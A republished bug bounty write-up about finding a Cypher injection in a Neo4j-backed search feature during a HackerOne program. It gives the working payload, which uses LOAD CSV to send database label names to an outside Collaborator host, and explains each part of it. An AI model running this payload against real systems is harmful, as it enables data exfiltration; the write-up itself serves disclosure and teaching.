---
title: The most underrated injection of all time — CYPHER INJECTION.
url: https://buaq.net/go-139386.html
source: unSafe.sh - 不安全
date: 2022-12-10
fetch_date: 2025-10-04T01:05:29.255373
---

# The most underrated injection of all time — CYPHER INJECTION.

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![]()

The most underrated injection of all time — CYPHER INJECTION.

memeBackgroundCypher is Neo4j’s graph query language that lets you retrieve data from the graph. It
*2022-12-9 19:56:51
Author: [infosecwriteups.com(查看原文)](/jump-139386.htm)
阅读量:18
收藏*

---

meme

> **Background**

Cypher is Neo4j’s graph query language that lets you retrieve data from the graph. It is like SQL for graphs, and was inspired by SQL.

Neo4j is a graph database management system that uses cypher as its prime language to query data from graphs, just like mySQL(which is a relational database management system) that uses sql as its prime language to query data from tables.

[More about cypher & neo4j here](https://neo4j.com/developer/cypher/)…

> **Finding the bug**

I was hacking in a private program on HackerOne. I have had found few high severity bugs there by then. This program had two pentest tenants in scope and credentials were provided for each. Each tenant had few organizations and the credentials gave access to some. There was a search feature in each tenant(to search organizations under it) which was rarely used. I went to burp suite and saw the request that was generated from the search feature. I have this habit of appending a single quote ( ' ) at the end of the search term without any expectations. But to my surprise, the server returned an error —

(not the complete error but it started like this, I found this bug while I was very new to bug bounties and never considered keeping any screenshot of errors) It was my first time seeing an error like this, I copied the starting part and searched it on google. From there I learnt about neo4j database and what cypher is. Cypher was very much like sql, thus next thing I searched was “cypher injection” on google(since sql based injections are called sql injection). There were very few articles about that bug, helping wise there were hardly 2–3 articles. I read them all and got an idea on how I might be able to exploit it. It took me 2 days to develop a working payload for the vulnerable target. The information I got on google surely had the base payloads but those did not work directly. I had to close some inverted commas, incomplete conditions, square brackets and finally partially complete the existing query(so that the overall query works normally) to finally break out and make it malicious. Here was the final payload that I came up with -

`.*' | o ] AS filteredOrganisations CALL db.labels() YIELD label LOAD CSV FROM 'http://<collaborator-url-here>/' + label AS r //`

> **Explanation of the payload**

`.*' | o ] AS filteredOrganisations`

This whole part was to close the current query partially. The above part partially closed the current query and helped adding new clauses to the original query.

`CALL db.labels() YIELD label`

The CALL clause is used to evaluate a subquery, here the subquery is calling db.labels(), a built-in procedure which returns a list of all labels used in the database. YIELD clause stores the returned list in the variable “label”.

`LOAD CSV FROM 'http://<collaborator-url-here>/' + label AS r //`

LOAD CSV is a clause used to load a csv file from a user defined location via the FROM keyword. Here the LOAD CSV makes a request to our burp collaborator client appending one element of the list “label” at a time. As a result multiple requests were sent to my burp collaborator client and all requests had different label names appended to the requested endpoint. The end part ‘AS r’ was only used because the query was breaking constantly without it, all it does is loads the csv file as “r” and the final two forward slashes ‘//’ were used to comment out the rest of the query in the same line.

All these parts combined formed the payload that helped me create a basic poc

> **Exploitation**

The overall exploitation looked like this —

raw exploitation

Sorry guys for the watermark, it’s still visible tho. I just wanted to share the whole raw exploitation poc. I don’t edit videos, thus didn’t feel like buying their subscription but it was important to hide the domain name so had to edit it anyway.

> **Conclusion**

Once I created the above poc, got super excited as it was going to be my first critical bug that involved both injection and ssrf. I quickly reported the bug. The next day I tried exploiting it more but for some reason my basic detection payloads were not working at all. Soon I realized the bug is fixed. I was not notified at all. It was frustrating at the moment but after few hours the team members acknowledged the bug and rewarded me with the highest bounty they were offering.

bounty

> **Takeaways**

Wont gonna bore you with common knowledge now. Its just do research, google stuff and use common sense. In my case, searching “cypher injection” was pure common sense after I got to know that cypher is a language similar to sql(or inspired from sql).

Read documentations. I honestly read a lot of stuff about cypher and neo4j and then was able to come up with that payload. The payload is very simple and the method I used is already available in the internet but still to apply the payload/s, I first had to know how the cypher queries work and analyze the vulnerable target properly.

> **A little about myself**

I’ll be honest, till now its the only critical I’ve found. I do find high severity bugs often but critical bugs have a different twist to them. There have been many times I thought I’ve found a critical and even managed to get my report triaged as critical(in few cases) but at the end due to some complexities it has always come down to high or medium. I would say don’t rush, sometimes high and mediums together can earn you some good money. I will definitely work hard next year to find some amazing bugs and hopefully some criticals (a few at least). Its been a year since I’ve seriously started bug hunting and it has been an incredible journey so far in terms of money, independence and time I’ve got. I am no pro, its just one of my cool finds which I felt like sharing : )

If you have read the write-up till here then thank you. I hope it was worth your time and you learnt something new.

Follow me on linkedin — <https://www.linkedin.com/in/marvelmaniac/>

Follow me on twitter — <https://twitter.com/maniacmarvel_>

## From Infosec Writeups: A lot is coming up in the Infosec every day that it’s hard to keep up with. [Join our weekly newsletter](https://weekly.infosecwriteups.com/) to get all the latest Infosec trends in the form of 5 articles, 4 Threads, 3 videos, 2 GitHub Repos and tools, and 1 job alert for FREE!

文章来源: https://infosecwriteups.com/the-most-underrated-injection-of-all-time-cypher-injection-fa2018ba0de8?source=rss----7b722bfd1b8d--bug\_bounty
 如有侵权请联系:admin#unsafe.sh

© [unSafe.sh - 不安全](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)

* admin#unsafe.sh
* [安全马克](https://aq.mk)
* [星际黑客](https://xj.hk)
* [T00ls](https://t00ls.net)